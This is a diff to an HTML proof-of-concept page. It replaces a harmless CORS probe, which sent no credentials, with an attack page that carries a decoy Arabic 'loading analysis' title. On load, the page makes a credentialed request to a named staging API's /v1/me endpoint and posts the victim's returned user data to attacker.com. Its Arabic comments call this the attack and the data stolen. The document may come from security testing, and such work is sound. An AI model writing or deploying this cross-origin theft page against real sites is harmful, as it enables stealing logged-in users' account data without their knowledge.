@@ -1,40 +1,35 @@
-<!DOCTYPE html>
-<html lang="en">
+<!-- attacker.com/cool-article -->
+<html>
 <head>
-<meta charset="UTF-8">
-<title>Safe CORS PoC</title>
+    <title>تحليل رائع!</title>
 </head>
 <body>
-<h2>Safe CORS PoC for /v2/auth endpoints</h2>
-<pre id="results"></pre>
+    <h1>جاري تحميل التحليل...</h1>
 
-<script>
-const endpoints = [
-    '/v2/login/',
-    '/v2/authenticate/login',
-    '/v2/authenticate/logout',
-    '/v2/authenticate/check',
-    // أضف أي مسارات auth مشبوهة هنا
-];
+    <script>
+        // عندما تتحميل الصفحة، قم بتنفيذ الهجوم
+        window.onload = function() {
+            // أرسل طلباً إلى الـ API الحساسة في موقع chainabuse-staging
+            fetch('https://api.chainabuse-staging.com/v1/me', {
+                method: 'GET',
+                credentials: 'include' // هذا هو الجزء الحاسم! يخبر المتصفح بإرسال الكوكيز مع الطلب
+            })
+            .then(response => response.json())
+            .then(userData => {
+                // الآن المهاجم يمتلك بيانات المستخدم كاملة!
+                console.log("Data stolen:", userData);
 
-const baseURL = 'https://go.capital.com';
-
-const resultsEl = document.getElementById('results');
-
-endpoints.forEach(ep => {
-    fetch(baseURL + ep, { credentials: 'omit' })
-    .then(res => res.text())
-    .then(data => {
-        const output = `✅ ${ep} - Response size: ${data.length}\nFirst 200 chars:\n${data.substring(0,200)}\n\n`;
-        resultsEl.textContent += output;
-        console.log(output);
-    })
-    .catch(err => {
-        const output = `❌ ${ep} - Error or blocked by CORS\n${err}\n\n`;
-        resultsEl.textContent += output;
-        console.log(output);
-    });
-});
-</script>
+                // قم بإرسال البيانات المسروقة إلى خادم المهاجم
+                fetch('https://attacker.com/log-stolen-data', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(userData)
+                });
+            })
+            .catch(error => {
+                console.error("Attack failed:", error);
+            });
+        };
+    </script>
 </body>
 </html>
